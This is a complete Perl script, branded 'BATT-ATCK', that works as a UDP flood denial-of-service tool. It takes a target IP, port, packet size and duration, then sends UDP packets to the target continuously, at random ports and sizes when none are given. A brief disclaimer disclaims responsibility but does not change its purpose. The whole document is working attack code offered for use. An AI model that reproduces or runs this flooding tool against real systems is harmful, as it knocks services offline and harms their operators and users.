##################
# UDP Flood-tool #
##################

use Socket;
use strict;

if ($#ARGV != 3) {
  print " \n";
  print "============================================================\n";
  print "\n";
  print "  BATT-ATCK | Bradley | https://github.com/RacingWithBrad\n\n";
  print "============================================================\n";
  print "\n";
  print " #Warning: I'm not responsible for any damage or illegal \n";
  print " #use of this script, please use responsibly and stay safe! \n";
  print "\n";
  print " -Command: attack.pl <ip> <port> <packets> <time>\n";
  print " -IP <ip>: The IP-Address of the target machine.\n";
  print " -PORT <port>: The Port you wish to target and flood.\n";
  print " If you're unsure of the desired target Port {ENTER}: '0'.\n";
  print " -PACKETS <packets>; The number of packets you wish to send.\n";
  print " The recommended amount is 64 Packets to 1024 Packets.\n";
  print " -TIME <time>: The attack/flood time in seconds. \n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Unable to connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);


print "Attack in progress on $ip through the port " . ($port ? $port : "random") . ", sends from " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? "for $time seconds" : "") . "\n";
print "Attack stopped with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
